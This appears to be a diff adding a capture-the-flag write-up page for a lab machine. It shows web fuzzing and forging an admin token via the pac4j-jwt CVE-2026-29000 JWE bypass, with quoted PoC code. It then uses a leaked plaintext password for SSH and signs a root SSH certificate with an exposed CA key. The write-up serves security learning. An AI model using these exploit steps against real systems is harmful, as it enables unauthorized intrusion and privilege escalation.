+                <pre><code class="language-bash"><span style="color:#56b6c2;">gobuster</span> dir -u <span style="color:#98c379;">"http://10.129.244.220:8080"</span> \
+  -w <span style="color:#98c379;">"/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt"</span> \
+  -t 200 -x html,jsp</code></pre>
+
+                <pre><code class="language-plaintext">api/actuator/env/language.jsp   (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env.jsp            (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env                (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator.html               (Status: <span style="color:#e06c75;">401</span>) [Size: 58]
+api/actuator/env/hostname       (Status: <span style="color:#e06c75;">401</span>) [Size: 58]</code></pre>
+
+                <p>A generic wordlist reveals additional paths:</p>
+
+                <pre><code class="language-plaintext">login           (Status: <span style="color:#98c379;">200</span>) [Size: 6152]
+error           (Status: <span style="color:#e06c75;">500</span>) [Size: 73]
+WEB-INF         (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+dashboard       (Status: <span style="color:#98c379;">200</span>) [Size: 3930]
+META-INF        (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+web-inf         (Status: <span style="color:#e06c75;">500</span>) [Size: 0]
+reset-password  (Status: <span style="color:#e5c07b;">501</span>) [Size: 110]</code></pre>
+
+                <p>Using Burp Suite to intercept the browser redirect before it hits <code>/login</code>, I can briefly
+                    see the <code>/dashboard</code> content:</p>
+
+                <p><img src="./media/image1.png"
+                        alt="Dashboard view of the application captured with Burp Suite before the redirect to login, showing the main interface of the platform" /></p>
+
+                <h3>Frontend JavaScript Analysis</h3>
+                <p>The JavaScript loaded on the login page is not obfuscated. Inspecting it reveals route constants and
+                    server-side role definitions — very useful for mapping the attack surface:</p>
+
+                <pre><code class="language-javascript"><span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">API_BASE</span> = <span style="color:#98c379;">''</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">JWKS_ENDPOINT</span>      = <span style="color:#98c379;">'/api/auth/jwks'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">AUTH_ENDPOINT</span>      = <span style="color:#98c379;">'/api/auth/login'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">DASHBOARD_ENDPOINT</span> = <span style="color:#98c379;">'/api/dashboard'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">USERS_ENDPOINT</span>     = <span style="color:#98c379;">'/api/users'</span>;
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">SETTINGS_ENDPOINT</span>  = <span style="color:#98c379;">'/api/settings'</span>;
+
+<span style="color:#7f848e;">// Role constants - must match server-side role definitions</span>
+<span style="color:#c678dd;">const</span> <span style="color:#e5c07b;">ROLES</span> = {
+    <span style="color:#e06c75;">ADMIN</span>:   <span style="color:#98c379;">'ROLE_ADMIN'</span>,
+    <span style="color:#e06c75;">MANAGER</span>: <span style="color:#98c379;">'ROLE_MANAGER'</span>,
+    <span style="color:#e06c75;">USER</span>:    <span style="color:#98c379;">'ROLE_USER'</span>
+};
+
+<span style="color:#c678dd;">function</span> <span style="color:#61afef;">renderNavigation</span>(role) {
+    <span style="color:#c678dd;">const</span> navItems = [
+        { label: <span style="color:#98c379;">'Dashboard'</span>, endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
+        { label: <span style="color:#98c379;">'Users'</span>,     endpoint: USERS_ENDPOINT,     roles: [ROLES.ADMIN] },
+        { label: <span style="color:#98c379;">'Settings'</span>,  endpoint: SETTINGS_ENDPOINT,  roles: [ROLES.ADMIN] },
+    ];
+    <span style="color:#c678dd;">return</span> navItems.<span style="color:#61afef;">filter</span>(item =&gt; item.roles.<span style="color:#61afef;">includes</span>(role));
+}</code></pre>
+
+                <p>The <code>/api/users</code> and <code>/api/settings</code> endpoints are admin-only. The goal is
+                    clear: get a token with <code>ROLE_ADMIN</code>.</p>
+
+                <p>Additional fuzzing under <code>/api</code> and <code>/api/auth</code> also reveals
+                    <code>/api/health</code>, which responds publicly:</p>
+
+                <pre><code class="language-json">{<span style="color:#98c379;">"status"</span>:<span style="color:#98c379;">"UP"</span>,<span style="color:#98c379;">"version"</span>:<span style="color:#98c379;">"1.2.0"</span>}</code></pre>
+
+                <h3>The JWKS Endpoint</h3>
+                <p>During Burp Suite inspection I noticed a request to <code>/api/auth/jwks</code>. This endpoint is
+                    standard in JWT/JWE implementations and exposes the server's RSA public key:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"keys"</span>: [{
+    <span style="color:#98c379;">"kty"</span>: <span style="color:#98c379;">"RSA"</span>,
+    <span style="color:#98c379;">"e"</span>:   <span style="color:#98c379;">"AQAB"</span>,
+    <span style="color:#98c379;">"kid"</span>: <span style="color:#98c379;">"enc-key-1"</span>,
+    <span style="color:#98c379;">"n"</span>:   <span style="color:#98c379;">"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"</span>
+  }]
+}</code></pre>
+
+                <p>This public key, combined with the vulnerability below, is the core piece of the attack.</p>
+
+                <h2>Vulnerability Research — CVE-2026-29000</h2>
+                <p>Searching for known issues with <code>pac4j-jwt/6.0.3</code> quickly surfaces an active CVE:
+                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29000">CVE-2026-29000</a>.</p>
+
+                <blockquote>
+                    <p>"pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3 contain an authentication bypass
+                        vulnerability in JwtAuthenticator when processing encrypted JWTs that allows remote attackers
+                        to forge authentication tokens. Attackers who possess the server's RSA public key can create a
+                        JWE-wrapped PlainJWT with arbitrary subject and role claims, bypassing signature verification
+                        to authenticate as any user including administrators."</p>
+                </blockquote>
+
+                <p>The public key from the JWKS endpoint is exactly what the attack needs.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>This is a variant of <em>algorithm confusion</em> or <code>alg: none</code>. The intended flow is:
+                    the server issues a JWT signed with its RSA private key (RS256), and when it receives one back it
+                    verifies that signature to guarantee authenticity.</p>
+
+                <p>The problem arises when a JWT arrives wrapped in a JWE (JSON Web Encryption). The server correctly
+                    decrypts the JWE using its private key, but then <strong>does not verify the signature of the inner
+                    JWT</strong>. An attacker can therefore create a <code>PlainJWT</code> (unsigned, <code>alg:
+                    none</code>) with arbitrary claims, wrap it in a JWE encrypted with the server's public key (freely
+                    available at <code>/api/auth/jwks</code>), and the server will accept it as valid.</p>
+
+                <h2>Forging the Admin Token</h2>
+                <p>I find a PoC for this CVE on GitHub:
+                    <a href="https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc/blob/main/poc.py">CVE-2026-29000 Python PoC</a>.
+                    The script takes the JWKS URL, the desired username and role as arguments:</p>
+
+                <pre><code class="language-plaintext">parser.add_argument("--jwks", required=True, help="JWKS endpoint URL")
+parser.add_argument("--user", default="admin",      help="Username (sub claim)")
+parser.add_argument("--role", default="ROLE_ADMIN", help="Role claim")</code></pre>
+
+                <p>Internally it fetches the public key from JWKS and encrypts a <code>PlainJWT</code> with the
+                    specified claims into a JWE using <code>RSA-OAEP-256</code> and <code>A128GCM</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">def</span> <span style="color:#61afef;">build_jwe</span>(plain_jwt, jwks_key):
+    <span style="color:#98c379;">"""Encrypt PlainJWT into JWE"""</span>
+    public_key = jwk.JWK.<span style="color:#61afef;">from_json</span>(json.<span style="color:#61afef;">dumps</span>(jwks_key))
+    protected_header = {
+        <span style="color:#98c379;">"alg"</span>: <span style="color:#98c379;">"RSA-OAEP-256"</span>,
+        <span style="color:#98c379;">"enc"</span>: <span style="color:#98c379;">"A128GCM"</span>,
+        <span style="color:#98c379;">"cty"</span>: <span style="color:#98c379;">"JWT"</span>,
+        <span style="color:#98c379;">"kid"</span>: jwks_key[<span style="color:#98c379;">"kid"</span>]
+    }
+    token = jwe.<span style="color:#61afef;">JWE</span>(
+        plain_jwt.<span style="color:#61afef;">encode</span>(),
+        protected=json.<span style="color:#61afef;">dumps</span>(protected_header)
+    )
+    token.<span style="color:#61afef;">add_recipient</span>(public_key)
+    <span style="color:#c678dd;">return</span> token.<span style="color:#61afef;">serialize</span>(compact=<span style="color:#e5c07b;">True</span>)</code></pre>
+
+                <p>The server decrypts the JWE (it has the private key), but since it doesn't verify the inner JWT
+                    signature, it accepts the <code>PlainJWT</code> with our arbitrary claims. Running the script:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">python3</span> cve.py --jwks http://10.129.244.220:8080/api/auth/jwks</code></pre>
+
+                <pre><code class="language-plaintext">[*] Fetching JWKS...
+[+] Public key loaded
+[+] PlainJWT created
+
+=== Malicious JWE Token ===
+eyJhbGciOiAi...
+
+Use it as:
+  Authorization: Bearer eyJhbGci...</code></pre>
+
+                <h2>Accessing Privileged Endpoints</h2>
+                <p>With the forged token I add the <code>Authorization: Bearer &lt;token&gt;</code> header to requests.
+                    First I query <code>/api/dashboard</code>, which confirms the bypass works and shows recent
+                    activity, user stats and system information. A notable announcement stands out:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"announcements"</span>: [
+    {
+      <span style="color:#98c379;">"severity"</span>: <span style="color:#98c379;">"warning"</span>,
+      <span style="color:#98c379;">"date"</span>: <span style="color:#98c379;">"2025-12-15"</span>,
+      <span style="color:#98c379;">"message"</span>: <span style="color:#98c379;">"SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked."</span>,
+      <span style="color:#98c379;">"title"</span>: <span style="color:#98c379;">"New SSH CA Rotation"</span>
+    }
+  ]
+}</code></pre>
+
+                <p>Interesting: they use an SSH CA for deployment certificates. Filing that for later. Next I query
+                    <code>/api/users</code> to enumerate all system users:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"users"</span>: [
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"admin"</span>,      <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_ADMIN"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"IT Security"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"svc-deploy"</span>, <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"deployer"</span>,    <span style="color:#98c379;">"note"</span>: <span style="color:#e5c07b;">"Service account for automated deployments via SSH certificate auth."</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"jthompson"</span>,  <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"amorales"</span>,   <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"bwright"</span>,    <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_MANAGER"</span>,<span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Operations"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"kkumar"</span>,     <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_ADMIN"</span>,  <span style="color:#98c379;">"active"</span>: <span style="color:#e06c75;">false</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"mwilson"</span>,    <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_USER"</span>,   <span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"QA"</span> },
+    { <span style="color:#98c379;">"username"</span>: <span style="color:#98c379;">"lzhang"</span>,     <span style="color:#98c379;">"role"</span>: <span style="color:#98c379;">"ROLE_MANAGER"</span>,<span style="color:#98c379;">"department"</span>: <span style="color:#98c379;">"Engineering"</span> }
+  ],
+  <span style="color:#98c379;">"total"</span>: <span style="color:#e5c07b;">8</span>
+}</code></pre>
+
+                <p>The <code>svc-deploy</code> account stands out: a service account for automated deployments via SSH.
+                    Now querying <code>/api/settings</code>:</p>
+
+                <pre><code class="language-json">{
+  <span style="color:#98c379;">"system"</span>: {
+    <span style="color:#98c379;">"applicationName"</span>: <span style="color:#98c379;">"Principal Internal Platform"</span>,
+    <span style="color:#98c379;">"javaVersion"</span>: <span style="color:#98c379;">"21.0.10"</span>,
+    <span style="color:#98c379;">"serverType"</span>: <span style="color:#98c379;">"Jetty 12.x (Embedded)"</span>
+  },
+  <span style="color:#98c379;">"security"</span>: {
+    <span style="color:#98c379;">"authFramework"</span>:        <span style="color:#98c379;">"pac4j-jwt"</span>,
+    <span style="color:#98c379;">"authFrameworkVersion"</span>: <span style="color:#98c379;">"6.0.3"</span>,
+    <span style="color:#98c379;">"jwtAlgorithm"</span>:         <span style="color:#98c379;">"RS256"</span>,
+    <span style="color:#98c379;">"jweAlgorithm"</span>:         <span style="color:#98c379;">"RSA-OAEP-256"</span>,
+    <span style="color:#98c379;">"jweEncryption"</span>:        <span style="color:#98c379;">"A128GCM"</span>,
+    <span style="color:#98c379;">"encryptionKey"</span>:        <span style="color:#e5c07b;">"D3pl0y_$$H_Now42!"</span>,
+    <span style="color:#98c379;">"tokenExpiry"</span>:          <span style="color:#98c379;">"3600s"</span>
+  },
+  <span style="color:#98c379;">"infrastructure"</span>: {
+    <span style="color:#98c379;">"sshCertAuth"</span>: <span style="color:#98c379;">"enabled"</span>,
+    <span style="color:#98c379;">"sshCaPath"</span>:   <span style="color:#98c379;">"/opt/principal/ssh/"</span>,
+    <span style="color:#98c379;">"notes"</span>:       <span style="color:#98c379;">"SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."</span>
+  }
+}</code></pre>
+
+                <p>The <code>encryptionKey</code> field leaks a plaintext credential. Given the naming and the
+                    <code>svc-deploy</code> service account we saw earlier, the association is obvious:
+                    <code>svc-deploy : D3pl0y_$$H_Now42!</code>.</p>
+
+                <p>The <code>infrastructure</code> section also confirms that the SSH CA lives at
+                    <code>/opt/principal/ssh/</code> — crucial for the upcoming privilege escalation.</p>
+
+                <h2>Initial Access — SSH as svc-deploy</h2>
+                <p>Testing the discovered credential over SSH:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh</span> svc-deploy@10.129.244.220</code></pre>
+
+                <p>It works. I gain access to the system and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation — Compromised SSH Certificate Authority</h2>
+                <p>Checking the current user's group memberships:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">id</span></code></pre>
+
+                <pre><code class="language-plaintext">uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(<span style="color:#e5c07b;">deployers</span>)</code></pre>
+
+                <p>The <code>deployers</code> group is a custom group. Finding everything it owns:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">find</span> / -group deployers 2&gt;/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/etc/ssh/sshd_config.d/60-principal.conf
+/opt/principal/ssh
+/opt/principal/ssh/README.txt
+<span style="color:#e5c07b;">/opt/principal/ssh/ca</span></code></pre>
+
+                <p>The file <code>ca</code> is the SSH Certificate Authority private key. Before exploiting it, I
+                    review the sshd configuration and README for context:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">cat</span> /opt/principal/ssh/README.txt</code></pre>
+
+                <pre><code class="language-plaintext">CA keypair for SSH certificate automation.
+This CA is trusted by sshd for certificate-based authentication.
+Use deploy.sh to issue short-lived certificates for service accounts.
+
+Key details:
+  Algorithm: RSA 4096-bit
+  Created:   2025-11-15
+  Purpose:   Automated deployment authentication</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">cat</span> /etc/ssh/sshd_config.d/60-principal.conf</code></pre>
+
+                <pre><code class="language-plaintext"># Principal machine SSH configuration
+PubkeyAuthentication   yes
+PasswordAuthentication yes
+PermitRootLogin        prohibit-password
+<span style="color:#e5c07b;">TrustedUserCAKeys      /opt/principal/ssh/ca.pub</span></code></pre>
+
+                <p>The <code>TrustedUserCAKeys</code> directive tells sshd to trust any certificate signed by the CA
+                    whose public key is at <code>/opt/principal/ssh/ca.pub</code>. Since we have read access to the
+                    <strong>private key</strong> at <code>/opt/principal/ssh/ca</code>, we can sign any certificate we
+                    want, including one for <code>root</code>.</p>
+
+                <p>Note that <code>PermitRootLogin prohibit-password</code> only blocks password-based root login — it
+                    does <strong>not</strong> block certificate-based authentication. The CA covers that.</p>
+
+                <h3>Forging an SSH Certificate for root</h3>
+                <p>I copy the CA private key to my attacking machine. Then I generate a new RSA key pair for a
+                    fictitious user (<code>pwned</code>):</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh-keygen</span> -t rsa -f pwned</code></pre>
+
+                <p>This produces <code>pwned</code> (private key) and <code>pwned.pub</code> (public key). Now I sign
+                    the public key with the CA, specifying <code>root</code> as the principal:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh-keygen</span> -s ca -I <span style="color:#98c379;">"pwned"</span> -n root -V +1h pwned.pub</code></pre>
+
+                <p>Key parameters:</p>
+                <ul>
+                    <li><code>-s ca</code> — CA private key to sign with</li>
+                    <li><code>-I "pwned"</code> — certificate identifier (any string)</li>
+                    <li><code>-n root</code> — principal: the user this certificate is valid for</li>
+                    <li><code>-V +1h</code> — validity window of one hour</li>
+                </ul>
+
+                <p>This generates <code>pwned-cert.pub</code>. Setting the correct permissions on the private key:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">chmod</span> 600 pwned</code></pre>
+
+                <p>Finally, connecting to the target as <code>root</code> using the certificate:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">ssh</span> -i pwned root@10.129.244.220</code></pre>
+
+                <p>SSH automatically picks up the associated certificate <code>pwned-cert.pub</code>. sshd verifies it
+                    is signed by the trusted CA and that the principal includes <code>root</code>, granting access. Root
+                    flag retrieved, machine complete.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
